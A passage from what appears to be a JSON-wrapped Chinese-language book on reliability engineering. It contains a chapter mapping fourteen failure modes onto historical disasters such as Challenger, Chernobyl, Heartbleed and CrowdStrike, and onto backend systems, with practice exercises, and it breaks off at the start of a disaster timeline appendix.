Anomaly Inquiry Board 報告（2017）**（https://sci.esa.int/documents/33431/35950/1567260317467-ESA_ExoMars_2016_Schiaparelli_Anomaly_Inquiry.pdf）：本章的反面對照組一級報告。把它與阿波羅 ALSJ 並讀，就是「同樣異常、兩種設計哲學、兩種結局」最乾淨的一課。\n"}, {"id": "ch23-normal-accidents-and-you", "file": "ch23-normal-accidents-and-you.md", "group": "Part VII — 怎麼安全地壞", "title": "ch23 — 正常意外與你：一個工程師該怕什麼，又該怎麼睡得著", "md": "# ch23 — 正常意外與你：一個工程師該怕什麼，又該怎麼睡得著\n\n> **本章解剖什麼**：這不是第二十二場災難，是把前面二十一場拆出來的那套刀法收進刀鞘。全書的核心商品——失敗模式語言 F1–F14——在這裡組裝成完整目錄：每一個模式配上它的定義、本書哪幾場真實災難命中了它、以及它藏在你後端／分散式世界裡的樣子。然後驗收四條全書主線（正常意外、瑞士起司、漂移、安全地壞），把「焦慮」這個你帶了二十一章的東西，翻譯成星期一早上能做的具體動作。最後給你一句誠實的結語：你消滅不了正常意外，你只能讓系統安全地壞、讓自己在孔洞對齊之前看見它。讀完，回到 ch01 那次凌晨兩點的 incident——你會發現你現在能說出它的每一片起司、每一個 F 編號，而那正是這本書要給你的全部。\n\n## 從你已知的出發\n\n回到開頭。ch01 我把你丟回那次凌晨兩點的 incident：PagerDuty 響了，某個核心 API 的 p99 latency 往上爬，5xx 噴出來，幾分鐘內對外不可用。當時我們在 postmortem 的「根因」欄填了一句乾淨的話——「缺少 index 的慢查詢」——然後在下面那串 contributing factors 裡，誠實地寫下了真正發生的事。\n\n現在你讀完了二十一章，我要你再讀一次那段 postmortem，但這次帶著整套詞彙。\n\n- 本地測試用的資料量級不對，所以慢查詢沒被抓到——這道縫已經開了幾個月。`F8`，潛伏條件。\n- CI 不檢查 SQL 的 explain plan——一個設計上的缺口。又一片有洞的起司。\n- 連線池上限是三年前拍板、之後沒人重看的數字，正常負載下綽綽有餘，所以「沒人覺得需要動它」——`F8` 疊著 `F6`（沒人重看＝被正常化的「它一直夠用」）。\n- 上游 retry 沒有退避，把已經見底的連線池踩得更死——`F1`（緊耦合：失效直接傳導、retry 無 buffer）＋ `F7`（級聯：一個服務的 5xx 滾成跨服務雪崩）。\n- 那條「DB 連線池使用率」的 alarm，閾值兩個月前因為誤報被人臨時調高、忘了調回——`F11`（監控盲區：該叫的警報沒叫）。\n- 觸發它的，是前一天傍晚一個引入慢查詢的部署——`F12`（變更即觸發）。它本身平凡無奇，致命的是它恰好讓上面那幾個潛伏條件對齊。\n\n`F8 + F3 + F12 + F1 + F11`。五個洞，一場凌晨兩點的小事故。把這串編號念給你聽，你應該已經有一種熟悉到發毛的感覺——因為它的形狀，跟三哩島那盞只顯示「指令」的指示燈（見 ch16）、跟車諾比那場為趕完成而逐一停用保護的測試（見 ch17）、跟 Cloudflare 那條一次推全球的 regex（見 ch10），是**同一個形狀**。差別只在規模、領域、和死了沒死人。\n\nch01 我說過：如果你能對自己的 incident 寫出「五片起司、五個洞」這樣一段，而不是「根因：某次部署」，你就已經學會了這本書要教的全部。現在，這一章把那套手法收口——把散在二十一章裡的 F 編號攤成一張總表，把「會講」升級成「星期一早上會做」。\n\n## 故障解剖：F1–F14 完整目錄與全書對照\n\n這是全書的累積產物——你帶得走的那套「貨幣」。每一個 F 模式，配它的定義（理論出處）、本書**真的命中它的主案**（引 chNN），和它在你後端／分散式系統裡的樣子。讀法：縱向掃一遍，你會發現同一個模式在飛機、反應爐、海上平台、雲端之間反覆出現——這正是「正常意外」這個詞要你看見的東西。\n\n| F | 失敗模式 / 出處 | 本書命中它的主案（chNN） | 在後端／分散式系統裡的樣子 |\n|---|---|---|---|\n| F1 | 緊耦合（Perrow） | ch01 連線池見底直通；ch08 壞數字直通推進器關閉；ch10 CPU 一滿正常流量直接 502；ch11 賣單無緩衝傳導；ch16 三哩島；ch12 德州電網 4 分 37 秒餘裕 | 沒有 queue／buffer 的同步呼叫鏈、無退避的 retry、共用連線池、一處 timeout 拖垮整條請求 |\n| F2 | 互動複雜度（Perrow） | ch03 塔科馬 flutter（主打）；ch06 兩套權威交互；ch09 Sleipner；ch11 HFT 互動；ch12 氣電循環依賴；ch13 隱藏相依；ch16；ch17 正空泡正回授 | 兩個各自正確的服務在某負載點開始互相放大、你 review 找不出的「互動裡的 bug」、隱藏的循環依賴 |\n| F3 | 起司孔洞對齊（Reason） | ch01 五層全沒擋；ch03 凱悅；ch06；ch07 金姆利；ch09 Sleipner；ch14 挑戰者；ch15 哥倫比亞；ch19 Heartbleed；ch20 SolarWinds（每層都驗來源不驗內容） | 多層防禦平時錯開、出事那天連成一線；「明明有測試有 review 有 alarm」卻全沒攔住 |\n| F4 | 安全系統即危險源（Perrow／Reason） | ch04 MCAS 主動壓機頭；ch17 車諾比 AZ-5 反引爆（最極端）；ch18 Morris 的「反免疫」設計反成 DoS | 你的 failover／autoscaling／看門狗／circuit breaker 在訊號錯誤時親手把系統推下去 |\n| F5 | 自動化的諷刺（Bainbridge 1983） | ch04 MCAS；ch05 法航 447（主打）；ch06 人機權威之爭；ch11 自動代理 | 平時全自動、出事時把生疏的爛攤子在最糟時刻丟回給人；團隊沒有手動接管的肌肉記憶 |\n| F6 | 偏差正常化／漂移（Dekker／Vaughan） | ch02 方法層；ch12 德州防寒早被警告；ch14 挑戰者（全書首次攤開）；ch15 哥倫比亞復發；ch17 車諾比 | 「這 alarm 每週都響、每次都沒事，我們調成 warning 了」；長期 flaky test、高但沒爆的錯誤率 |\n| F7 | 級聯／雪崩（Perrow） | ch01 跨服務雪崩；ch11 hot-potato 正回授；ch12 級聯；ch13 一節點崩潰擴散全球；ch18 Morris 再感染 | retry storm、thundering herd、快取踩踏、一個下游慢拖垮整條呼叫鏈 |\n| F8 | 潛伏條件 vs 觸發（Reason） | ch01 五個洞早裝填；ch02 解剖刀脊椎；ch03；ch07；ch08；ch09；ch12；ch14；ch17；ch19 潛伏兩年；ch20 SUNBURST 潛伏九月 | 過時的設定、沒人敢動的死碼、被靜音的 alarm——你的系統此刻就帶著一堆，你只知道一定有 |\n| F9 | 介面與假設的縫（Perrow／Reason） | ch03 凱悅受力假設（主打）；ch05 失速警告前提；ch07 磅當公斤（主打）；ch08 負高度（主打）；ch09 模型 vs 現實；ch19 宣告長度 vs 實際 payload | 兩個各自正確的子系統對「單位／契約／前提」假設不一致；信 metadata 不驗 payload |\n| F10 | 單一故障點／單一感測器（Perrow） | ch04 單一 AoA 感測器（主打）；ch08 過度信任單一估計；ch12 孤島電網無法外援 | SPOF、單一健康檢查訊號就採取激烈動作、沒有獨立交叉驗證的信任 |\n| F11 | 監控盲區（Reason） | ch01 alarm 該叫沒叫；ch04 對操作員隱藏；ch05 警報反直覺；ch06 雷達降級電話不通；ch15；ch16 指示燈顯示意圖（主打）；ch17 | 你監控的是「期望狀態」還是「實際狀態」？dashboard 顯示「已部署」是真在跑，還是只是「指令已送出」 |\n| F12 | 變更即觸發（Reason／Dekker） | ch01 部署是稻草；ch03 凱悅變更（主打）；ch10 一次推全球（主打）；ch13 自動更新；ch20 投毒管道（主打） | 部署、設定更新、程式重用、旗標切換、自動更新——「動了它」就是觸發 |\n| F13 | 生產壓力壓過安全（Dekker／Vaughan） | ch02 方法層；ch04 認證壓力；ch06 人力不足；ch14 發射前夜電話（主打）；ch15；ch17 為完成測試停用保護 | 進度／成本／窗口壓過「先停下來查清楚」；跳 CI gate、關 health check 趕上線 |\n| F14 | 規模放大／單一栽培（blast radius／monoculture） | ch10 一次推全球；ch12 同時失效；ch13 850 萬台同藍屏（主打）；ch18 Unix 同質生態（主打）；ch19 同一塊地基；ch20 無所不在的 Log4j | 同質化＋規模＝單點打中所有人；全域同步部署、單一 region、一個被全世界 import 的套件 |\n\n把這張表念一遍，你會看到三件事。\n\n第一，**沒有任何一場災難只命中一個 F**。挑戰者是 `F6+F13+F3+F8`，車諾比是 `F4+F13+F6+F8+F11+F2`，Heartbleed 是 `F9+F8+F14+F3`。這就是「單一根因是錯的問法」的具體證據——每一場都是一組編號的特定組合，不是一個編號。\n\n第二，**同一個 F 在完全不同的領域反覆出現**。`F11`（監控盲區）把三哩島那盞指示燈（見 ch16）、法航 447 那套反直覺警報（見 ch05）、和你那條被調瞎的連線池 alarm（見 ch01）串成同一張臉：你看到的世界與真實世界脫節。`F14`（規模放大）把 1988 年的 Morris 蠕蟲（見 ch18）和 2024 年 CrowdStrike 的 850 萬台藍屏（見 ch13）串成同一個機制：同質化讓一份壞東西一次打中所有人。三十六年，同一個形狀。\n\n第三，**F4 是這張表裡最反直覺、也最該記住的一行**。安全系統即危險源——你蓋來保護的東西，本身成了直接成因。MCAS 是為了讓操縱手感「像舊 737」而生的自動修正，它親手把兩架飛機壓向地面（見 ch04）；車諾比那顆寫著「緊急停止」的 AZ-5，按下去的瞬間反而引爆爐心（見 ch17）。對照組是阿波羅 11 的重啟保護（見 ch22）——同樣是保護機制，差別只在它失效時是 fail-safe 還是 fail-deadly。你系統裡每一個「為了安全而加」的機制——failover、看門狗、circuit breaker、autoscaling——都該被問一句：它在最壞情況下的行為，是救命還是點火？\n\n## 換成你的系統：星期一早上做什麼不同的事\n\n二十一章的「怕」，到這裡必須變成可操作的判斷力，否則它只是焦慮。下面這份清單不是「要小心」的口號，是星期一早上你能在 IDE、在 PR、在 oncall 排班表上做的具體動作。分三層：**事前**（在災難裝填前拆掉孔洞）、**事中**（孔洞對齊時別把事情弄得更糟）、**文化**（對抗那個一直在製造潛伏條件的機制）。\n\n### 事前——在潛伏條件裝填好之前看見它\n\n- **畫一張你某個服務的依賴圖，然後找循環依賴（F2／F13 雲端連鎖，見 ch13）。** 重點不是你架構圖上那層——循環依賴幾乎從不在你畫的層級。把你的**災難復原路徑**當成一條獨立的依賴鏈來畫：登入要 SSO、SSO 要網路、部署要拉 image、image registry 跑在你正要救的 cluster 上、oncall 要看 runbook、runbook 在你正掛掉的 wiki 上。問每一步：它依賴的東西，會不會就是我正在搶救的那個？Meta BGP 那次（見 ch13）的環，就藏在「修復要登入、登入要網路、網路是要修的東西」。\n- **盤點你的 blast radius，問「一份壞東西能一次打中多少人」（F14，見 ch13、ch18）。** 列出你執行環境裡所有會**自我更新、而你對 rollout 節奏零控制**的東西：EDR、log shipper、service mesh sidecar、base image 的自動安全更新。對能控制的，要求廠商支援分階段；對不能控制的，至少在事故簿留一行「這是一個我無法 canary 的單點」。CrowdStrike 那次（見 ch13），就是一個你信任的安全 agent 全球同步推送、一次打中 850 萬台。\n- **給每一個「為了安全而加」的機制裝 kill switch（F12，見 ch10）。** 一個不需重新部署、能立刻關掉某功能的開關。Cloudflare 那條 regex（見 ch10）能在 27 分鐘止血，靠的就是全球 kill switch。但記得：kill switch 自己不能變成 SPOF，而且要**演練**——沒演練過的 kill switch，等於沒有。\n- **把假設寫成 contract test 與 sanity check（F9，見 ch07、ch08、ch19）。** 帶單位的型別（金姆利的磅當公斤，見 ch07，就是少了這個）；對任何上游傳來的數值做合理性閘門（Schiaparelli 的「負高度」，見 ch08，一行「高度不可能是負的」就擋下了）；對任何「宣告長度」比對「實際 payload」（Heartbleed，見 ch19）。你那條 CI 強制 OpenAPI 同步的規則，就是 contract test 的正面教材——把同樣的紀律推到數值邊界與單位上。\n- **清除死碼、給「暫時」設過期日（F8，見 ch19、ch14）。** 你系統裡此刻就帶著一堆 latent condition：過時的設定、沒人敢動的死碼、被靜音的 alarm。你不知道是哪些，你只知道一定有。定期完整重啟驗證、把「暫時調高的閾值」設一個會在 sprint 結束時提醒你的過期日——別讓「暫時」變成「正常」。\n\n### 事中——孔洞已經對齊時，別讓自己變成第六個洞\n\n- **寫 blameless postmortem，而且檢查你的範本本身是不是孔洞（見 ch02、ch15）。** 你的範本裡有「root cause」這一欄嗎？如果有，它每一次都在溫柔地逼你的調查收斂到單一原因——把一張被穿透的網壓扁成一條線。改成複數「contributing factors」，並強制列出**至少三層各自獨立的防禦為什麼都沒擋住**。blameless 不是寫在範本頂端那行字，是寫在當事人**相不相信誠實是安全的**這件事上——一旦追究個人，你就再也拿不到真相，下一次同型事故無法預防。\n- **永遠看實際狀態，不看意圖（F11，見 ch16、ch13）。** 三哩島那盞燈（見 ch16）顯示的是「我送了關閉指令」，不是「閥門真關了」——操作員據此用完美的邏輯把爐心推向熔毀。你的 dashboard 顯示「已部署」，是真在跑（actual），還是只是「指令已送出」（desired）？你的 alarm 依賴的 metric，會不會跟被監控的服務死在同一個 region？健康訊號和健康檢查的對象，必須有獨立的命運。\n- **事先定義好 override 的優先權（F5，見 ch06）。** 于伯林根（見 ch06）的核心不是「俄國機組的錯」——兩台 TCAS 都完美運作、互補地一升一降，崩的是「衝突時誰優先沒有規定」。事後 ICAO 確立 TCAS RA 優先於 ATC，消除了那個致命模糊。回頭看你系統裡：人工 override 與自動機制可能衝突的地方，優先權定義了嗎？兩套監控對同一狀態給出矛盾結論時，誰贏？這個規則必須在出事**之前**就寫好，不能在凌晨兩點臨時裁決。\n\n### 文化——對抗那個一直在製造孔洞的機制\n\n事前事中都是補單一的洞。但 ch01 末尾我問過一個更深的問題：你的系統有沒有一個**製造 latent condition 的機制**？「alarm 太吵就調高、沒人追蹤、沒人調回」這個流程本身，就是一台孔洞製造機。\n\n這就是偏差正常化（F6，見 ch14、ch15）的工程版，也是全書組織線的終點。挑戰者的 O-ring 侵蝕（見 ch14）從「異常」被一次次重新定義為「可接受」；十七年後哥倫比亞（見 ch15）證明了，寫得出好的 postmortem **不等於**學到教訓——文化不變，action items 會腐爛，同型事故會精準復發。\n\n所以文化層只有一個動作，但它最難：**定期挑戰「為什麼這還沒爆」。** 列出你團隊三個「已知問題、暫時沒爆、大家習慣了」的東西——長期 flaky test、長期高但沒爆的錯誤率、那個「下次一定修」的循環依賴。對每一個問：這是「我們評估過、接受的風險」，還是「我們只是習慣了它沒爆」？這兩者的差別，就是挑戰者與哥倫比亞之間那十七年。翻出你團隊一年前某次 postmortem 的 action items，數數幾項真落實了——這個數字，就是你文化的體溫。\n\n## 四條全書主線：驗收\n\n讀到這裡，把全書貫穿的四條主線各自驗收一次。你應該能用自己的話對另一個工程師講清楚每一條。\n\n**一、正常意外（Perrow，ch01 定調）。** 在「互動複雜度高 × 緊耦合」的系統裡，嚴重事故不是異常，是統計上遲早會發生的常態——不是「有沒有」，是「何時、以哪種對齊方式」。三哩島（見 ch16）是 Perrow 的原型案例；你那台 10K+ CCU、跑著 K8s CronJob→SQS→冪等消費者結算 pipeline 的系統，互動複雜度與耦合度都不低——所以對你而言，下一次 incident 也不是「會不會」，是「何時、哪幾片起司對齊」。這不是悲觀，是把運氣換成準備。\n\n**二、瑞士起司／多重失效合謀（Reason／Cook，ch01 定調）。** 災難需要多層防禦的孔洞同時對齊；任何一層擋住就沒事。所以「找單一根因」是錯的問法——要找的是「為什麼每一層都沒擋住」。閃電崩盤（見 ch11）到今天兇手都還在爭，這件事本身就替這條主線做了活體示範：你最想找的那個「兇手」，可能根本不存在。Cook 還補了一句你該刻在牆上的話——**複雜系統永遠運行在退化模式**：你的系統此刻就帶著一堆 latent condition 在跑，它「正常運作」只是因為那些洞還沒對齊。\n\n**三、漂移到失效／偏差正常化（Dekker／Vaughan，ch02 定義、ch14 主打）。** 系統不是某天「砰」一下壞掉，是一次次僥倖把異常變成常態，把安全邊界慢慢吃掉，直到某天孔洞對齊。挑戰者（見 ch14）、哥倫比亞（見 ch15）、德州電網（見 ch12，2011 年就被警告過的防寒）——這條線在組織裡最頑固、也最致命。多數調查報告的最終落點，都在這條線上，不在技術 bug 上。\n\n**四、安全地壞（焦慮工程師的信條，ch22 提出、本章收束）。** 韌性不是「不會壞」，是安全地壞——graceful degradation、blast radius 控制、bulkhead、kill switch、冗餘的「多樣性」（不是複製同一份 bug）。阿波羅 11（見 ch22）的導引電腦過載時丟掉低優先工作、保住關鍵任務，穩穩落地；金姆利滑翔機（見 ch07）靠設計餘裕加人的技藝無動力迫降成功——這兩個正面案例，跟 Schiaparelli 那個壞數字直通推進器關閉（見 ch08）的差別，只在於系統選擇了優雅降級還是緊耦合直通。你那個帶著全團隊用的多層 cache library（in-memory → S3 → local，含 graceful degradation），就是這條主線的雛形——一層壞了退到下一層。本章把它從你已經在做的一件事，升級成你看待整個系統的眼鏡。\n\n## 跨書的兩條線\n\n兩件事點到為止，指向你書架上的另外兩本書，不在這裡展開。\n\n**防禦＝不變式，災難＝安全性質被違反。** 本書講的「在哪一層加哪一道防禦」，在形式化方法裡有一個更精確的名字：你加的每一道 sanity check、每一個合理性閘門、每一條「override 優先權」，本質上都是一個**不變式（invariant）**——一個你斷言系統在任何狀態下都必須維持為真的性質。而每一場災難，都是一個**安全性質（safety property）被違反**的時刻：「高度不可能是負的」（Schiaparelli，見 ch08）就是一條沒被寫下、於是沒被檢查的安全性質。想把「我覺得這裡應該不會壞」變成「我能證明這裡不會違反這條性質」，那是《把系統寫成定理：TLA+ 與形式化方法》在做的事。\n\n**為什麼「百年一遇」會在第三年發生。** 你在德州電網那章（見 ch12）讀到「2011 年就被警告過」——那場寒潮被當成百年一遇，於是防寒被免除。但「百年一遇」是一個關於機率的陳述，而機率最容易被誤用的地方，正是把「單一事件每年 1% 機率」錯當成「一百年內只會發生一次」。當你有夠多的獨立機會、夠長的時間、夠多同質的系統，尾端的罕見事件會比你的直覺**早得多**地到來——這也正是 `F14`（規模放大）在統計上的另一面。要把這個直覺校準到能算的程度，去讀《馴服隨機：機率與統計》。\n\n## 誠實的結語\n\n我不會用一個漂亮的收尾騙你。\n\n你消滅不了正常意外。只要你的系統還是「互動複雜度高 × 緊耦合」——而任何一個值得做的分散式系統都是——嚴重事故就是它的內建性質，不是可以被根除的 bug。你蓋的每一道防禦，本身都可能變成下一個 `F4`；你加的每一層自動化，都可能拿走操作員出事時最需要的那塊狀況意識（`F5`）；你做的每一次「等價」重構，都可能像凱悅那根吊桿（見 ch03）一樣悄悄改了受力結構。\n\n你能做的，只有兩件事，而這兩件事就是這本書的全部：\n\n**讓系統安全地壞。** 不是追求「不會壞」——那是幻覺，是「應該沒事吧」的高級版。是讓它壞的時候有降級路徑、有 blast radius 邊界、有 kill switch、有獨立命運的監控。是讓下一次 incident 停在第三片起司，而不是穿透到使用者。\n\n**讓自己在孔洞對齊之前看見它。** 這就是 F1–F14 這套語言的全部價值——它讓你在說出「應該沒事吧」的那一刻，能立刻指認：那是哪一號模式正在裝填。是 `F8`（一個被正常化的潛伏條件）？是 `F2`（一個你沒畫出來的循環依賴）？是 `F11`（一個你監控了意圖卻沒監控現實的地方）？看見它，你就有機會在它對齊成災難之前補上一片起司。\n\n焦慮工程師的本能——「這裡會怎麼壞」——從來不是病。它是你最值得信任的工程直覺。這本書做的，只是給那份焦慮一套詞彙、一張地圖、和二十一個跨越七十年與多個領域的對照案例，讓它從一種讓你睡不著的情緒，變成一種讓你睡得著的判斷力。\n\n你睡得著，不是因為你相信系統不會壞。是因為你已經畫好了依賴圖、設好了 blast radius、裝好了 kill switch、寫好了 override 優先權、而且你知道——下一個孔洞正在某處慢慢對齊，但這一次，你會在它連成一線之前看見它。\n\n下一次凌晨兩點 PagerDuty 響起來的時候，你不會再只寫「根因：某次部署」。你會寫出那五片起司、那五個洞、那一串 F 編號——然後你會去補那個真正能關掉一整條軌跡的洞，而不只是那根稻草。\n\n那就是這本書要給你的全部。\n\n## 紙上推演\n\n### 推演題1 — 用 F1–F14 對你目前負責的系統做一次孔洞盤點 **[60 分鐘] ★★★**\n\n挑一個你此刻真正負責、且出事會痛的系統（不是玩具專案）。拿 F1–F14 總表當 checklist，逐一問：「這個模式，藏在我這個系統的哪裡？」對每一個 F，寫下一句具體的話——不是「我們有緊耦合風險」這種廢話，是「結算 pipeline 的 SQS 消費者直接同步呼叫下游定價服務，沒有 buffer，下游慢 500ms 就會讓消費者堆積、觸發 visibility timeout 重投、放大成 retry storm（`F1+F7`）」這種能畫出因果鏈的話。盤完一輪，把它們依「補上之後能關掉一整條軌跡」還是「補了只是把下次對齊延後」分兩類。\n\n#### 推演解答\n\n這題沒有標準答案，但有及格線。**及格的盤點，每個 F 都該命中至少一處具體的、你說得出觸發條件的東西**；如果某個 F 你寫不出任何一條，有兩種可能：(a) 你的系統真的在那個維度很乾淨（少見，但可能——例如一個純無狀態、無自動化決策的服務，`F5` 可能真的空）；(b) 更常見：那個維度有洞，但你還沒學會看見它。`F2`（互動複雜度）和 `F8`（潛伏條件）是最常被漏掉的兩個，因為它們不在任何一段程式碼裡——`F2` 在互動裡，`F8` 在「沒人重看的設定」裡。\n\n分兩類的那一步是這題的真正價值。回想 ch01 末尾：有些洞補上就真的關掉一整條軌跡（「連線池加上快速失敗與合理上限」，直接讓慢查詢無法拖垮整池）；有些洞補了只是把下次對齊延後（「這條 alarm 閾值調回去」——但下一條被靜音的 alarm 還在排隊）。前者是修系統，後者是修 bug。一個成熟的盤點，會讓你看出哪幾個洞屬於同一個「孔洞製造機」（例如「alarm 太吵就調高、沒人追蹤」這個流程），那台機器才是你該優先拆的東西。\n\n### 推演題2 — 把全書講給一個資淺工程師聽，一場災難＝一個模式 **[45 分鐘] ★★**\n\n不准看書、不准看這張表。對著一個假想的資淺工程師（或真的找一個），用十到十五分鐘，把這本書講完。規則：**每一場災難只准用一句話帶過，且那句話必須點出它的主打 F 模式和它在後端世界的對應**。例如:「三哩島，一盞燈只顯示『我送了指令』不顯示『閥門真關了』——這是 `F11` 監控盲區，跟你 dashboard 顯示『已部署』其實只是『指令已送出』是同一件事。」講完二十一章，最後用三句話收尾：正常意外、瑞士起司、安全地壞。\n\n#### 推演解答\n\n這題在逼你做一件事：**檢驗你是不是真的把這套語言內化成了「貨幣」**。如果你能流暢地一場接一場講下去，每一場都自然落到一個 F 編號和一個你自己的系統對照，那你就過關了——這正是 style-guide 開頭說的「能用自己的話對另一個工程師講清楚」。\n\n講的過程中，你大概會發現三件事。第一，**有些災難你會卡住**——通常是因為你記得故事但沒記住它的形狀（F 編號）。那些就是你該回去重讀「對應模式」block 的章。第二，**有些 F 你會重複用很多次**——`F8`、`F3`、`F11` 幾乎場場都有，這不是你講錯，這是真的：潛伏條件、孔洞對齊、監控盲區，本來就是複雜系統失效的共通骨架。第三，**講到後端對應時最能暴露理解深度**——「跟你 dashboard 顯示『已部署』是同一件事」這種句子，講得出來才代表你真的把跨領域的形狀對上了，而不只是記住了一堆空難故事。\n\n收尾那三句話如果講得出來且不打結，這本書對你就成立了。\n\n### 推演題3 — 寫下你星期一要改的三件事 **[30 分鐘] ★★**\n\n不是「以後要更小心」。是三件**具體、可在這週內動手、且你說得出它擋住哪個 F** 的事。格式強制如下，每件一行：\n\n> 動作：＿＿＿｜擋住：F＿＿｜代價：＿＿＿｜為什麼是這三件（性價比）：＿＿＿\n\n#### 推演解答\n\n範例（你的會不同，但形狀該長這樣）：\n\n> 動作：給結算 pipeline 那個直連下游定價服務的同步呼叫，加一道 circuit breaker＋降級到「先入暫存佇列、稍後補算」｜擋住：F1＋F7｜代價：多一條程式碼路徑與最終一致性窗口、要處理補算冪等（你已經有冪等消費者的肌肉，這代價對你低）｜為什麼：它把「全有或全無」變成「降級服務」，直接消除最致命的崩法，性價比最高。\n\n> 動作：把那條兩個月前被臨時調高、忘了調回的連線池 alarm 閾值改回，並在 IaC 裡給所有「臨時調整」加一個 sprint 結束時提醒的過期標記｜擋住：F11＋F6｜代價：幾乎為零，主要是建立流程｜為什麼：它不只補一個洞，是拆掉「調高就忘」這台孔洞製造機。\n\n> 動作：畫一次災難復原路徑的依賴鏈（登入→部署→rollback→看 runbook），標出有沒有任一步依賴正在搶救的東西｜擋住：F2 隱藏循環依賴｜代價：一個下午｜為什麼：循環依賴藏在你沒畫的層級，不畫永遠看不見，而它在真出事時最致命。\n\n解答的重點不在內容，在**紀律**：ch22 教過你「給一個現有系統，加哪三道防線性價比最高」——graceful degradation（擋 F1）、circuit breaker（擋 F7）、kill switch（擋 F12）通常是性價比前三名，因為它們各自關掉一整條軌跡、且彼此互補。如果你寫下的三件事裡有任何一件是「以後開會多討論」「大家要更注意」這種沒有動詞、沒有 F 編號的句子——刪掉它，它是焦慮，不是判斷力。\n\n### 推演題4 — 反事實：挑一場災難，問「如果它有阿波羅的設計哲學會怎樣」 **[20 分鐘] ★★**\n\n從本書挑一場最讓你印象深刻的災難。問：如果它的系統是用阿波羅 11 導引電腦（見 ch22）那套「優先權排程＋過載時丟棄低優先工作、保住關鍵任務」的哲學蓋的，這場災難會不會發生？會以什麼形狀發生（或不發生）？\n\n#### 推演解答\n\n最乾淨的對照是 Schiaparelli（見 ch08）——ch22 已經點明它們是同一個「異常輸入」場景的正反兩面。阿波羅的 AGC 收到雷達偷走的 CPU 負載（一個異常狀況）時，它沒有當機，也沒有盲目信任、繼續積分一個荒謬的結果——它的設計讓它**重啟、丟棄低優先工作、保住關鍵導引**。Schiaparelli 的 GNC 收到一個飽和的 IMU 值（也是異常狀況）時，沒有任何一層問「這合理嗎？高度不可能是負的」，就把它當真值積分、算出負高度、據此關掉推進器。\n\n所以反事實的答案是：如果 Schiaparelli 有阿波羅的哲學，那道「sanity check／合理性閘門」就會在壞數字與「關掉推進器」這個不可逆決策之間插入一層緩衝（解耦 `F1`）——它會偵測到「這個輸入超出物理可能範圍」，降級到一個安全模式（例如保持當前姿態、等下一個有效讀數），而不是拿一個不可能的數字去做不可逆的事。災難不會發生，或至少不會以「自由落體墜毀」的形狀發生。\n\n這題的領悟：阿波羅和 Schiaparelli 的差別**不在硬體可靠度，在設計哲學**——一個假設「輸入可能是錯的，所以要 fail-safe」，一個假設「輸入是對的，照單全收」。你系統裡每一個信任上游數值、未做合理性檢查的地方，都站在 Schiaparelli 那一邊。把它搬到阿波羅那一邊，只需要一行檢查——但前提是你先看見那個假設。\n\n## 自我檢核\n\n口頭自答，講得出來才算過關。\n\n1. 不准看表——說出 F1 到 F14 的名字，並各舉一個本書命中它的主案。卡在哪幾個？那幾個就是你還沒內化的。\n2. 為什麼說「沒有任何一場災難只命中一個 F」？這件事如何證明「單一根因是錯的問法」？\n3. `F4`（安全系統即危險源）為什麼是這張表裡最反直覺、也最該記住的一行？用 MCAS（見 ch04）和 AZ-5（見 ch17）對照阿波羅的重啟保護（見 ch22）來答。\n4. 「事前」清單裡，為什麼「畫災難復原路徑的依賴鏈」比「畫架構圖」更可能抓到循環依賴？（提示：循環依賴藏在哪一層）\n5. 為什麼「看實際狀態而非意圖」是 `F11` 的核心防禦？三哩島那盞燈（見 ch16）和你 dashboard 上的「已部署」，共用哪個謊言？\n6. 「我們有 blameless postmortem 文化」這句話，可能在哪兩個地方其實是假的？（提示：範本裡的某一欄、timeline 是誰寫的）\n7. 為什麼說「你消滅不了正常意外，只能讓系統安全地壞」不是悲觀，而是把運氣換成準備？\n8. 四條全書主線——正常意外、瑞士起司、漂移到失效、安全地壞——你能不能各用一句話，把它對應到你自己維運過的一次真實 incident？\n\n## 延伸閱讀\n\n收束全書的書單見附錄 C；這裡只列「讀完這本之後，該往哪走」的四條。\n\n- **Charles Perrow,《Normal Accidents: Living with High-Risk Technologies》(1984／1999 修訂版)** — 全書的源頭。「互動複雜度 × 緊耦合」的二維分類就出自這裡；讀它你會發現本書二十一章只是它的當代註腳。\n- **Richard Cook,〈How Complex Systems Fail〉(短文，網路免費)** — 十八條，每條一兩句。「複雜系統永遠運行在退化模式」「根因是事後建構」都在這裡。印出來貼在牆上，每季重讀一次。\n- **Sidney Dekker,《Drift into Failure》與《The Field Guide to Understanding 'Human Error'》** — 漂移到失效與 just culture 的權威。當你下次想在 postmortem 寫「人為疏失」時，先讀完《Field Guide》第三章。\n- **你書架上的另外兩本** —《把系統寫成定理：TLA+ 與形式化方法》教你把本章的「防禦」寫成可驗證的不變式；《馴服隨機：機率與統計》教你算清楚「百年一遇」到底多久會來一次（見 ch12 德州電網那個被誤用的「百年一遇」）。\n"}, {"id": "appendix-a-timeline", "file": "appendix-a-timeline.md", "group": "附錄", "title": "附錄 A — 災難年表", "md": "# 附錄 A — 災難年表\n\n這是一張跨全書的索引：把書裡解剖過的每一場災難依年份排開，方便你回頭定位「哪一案在哪一章、它主打哪幾號失敗模式」。所有事實錨定在 `_meta/landscape-2026-06.md`，數字一律照各章原文的口徑 hedge（有爭議的死傷與金額給範圍、標 ⚠️）。讀法見章末的收束段。\n\n## 年表總表\n\n從電腦出現之前的鋼鐵與混凝土（塔科馬 1940、凱悅 1981），一路排到雲端時代（CrowdStrike 2024）。同一個 F 模式如何跨越領域與年代反覆出現，看欄位最右邊的「主打 F」一路往下讀就知道。\n\n| 年份 | 案件 | 領域 | 死傷／規模（hedged） | 主打 F 模式 | 章 |\n|---|---|---|---|---|---|\n| 1940 | 塔科馬海峽橋 aeroelastic flutter | 土木／橋樑 | 0 死（僅一隻犬）；主跨全毀 | F2（互動複雜度：風與柔性結構的自激正回授，非共振） | ch03 |\n| 1969 | 阿波羅 11 號 1201/1202 程式告警 **〔正面反例〕** | 太空／航太電腦 | 0 死；過載未釀災、成功著陸 | F4 的反面：超載時優先權排程重啟、優雅降級而非崩潰 | ch22 |\n| 1979 | 三哩島 TMI-2 部分爐心熔毀 | 核能 | 0 死、無可偵測公眾健康影響；爐心約 45% 熔毀 | F11、F9、F2、F1（指示燈反映「指令」非「閥位」） | ch16 |\n| 1981 | 凱悅麗晶飯店空橋崩塌 | 土木／建築 | 114 死、216 傷 | F9＋F12（連接細節變更使接點受力翻倍、責任分散） | ch03 |\n| 1983 | 金姆利滑翔機（Air Canada 143） | 航空 | 0 死（僅輕傷）；無動力滑降迫降成功 | F9、F8、F3（磅當公斤＋油量錶失效；正面：graceful degradation） | ch07 |\n| 1982–1983 | 溫哥華證交所指數截斷誤差 | 